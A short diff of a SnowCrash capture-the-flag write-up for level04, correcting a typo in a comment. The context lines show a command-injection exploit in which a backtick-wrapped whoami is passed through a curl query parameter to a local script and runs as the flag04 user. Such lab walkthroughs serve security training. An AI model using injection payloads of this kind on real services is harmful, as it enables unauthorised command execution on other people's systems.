@@ -22,7 +22,7 @@ level04@SnowCrash:~$ nc -zv localhost 4747
 Connection to localhost 4747 port [tcp/*] succeeded!
 # Script expects a value passed in x parameter which is passed to x() function.
 # Then, while printing it, backticks are used to evaluate argument by echoing it.
-# So trying to pass whoami command substition reveals that is evaluated and executed as flag04.
+# So trying to pass whoami command substitution reveals that is evaluated and executed as flag04.
 level04@SnowCrash:~$ curl localhost:4747/?x="\`/usr/bin/whoami\`"
 flag04
 # All that remains to be done is to execute getflag binary.
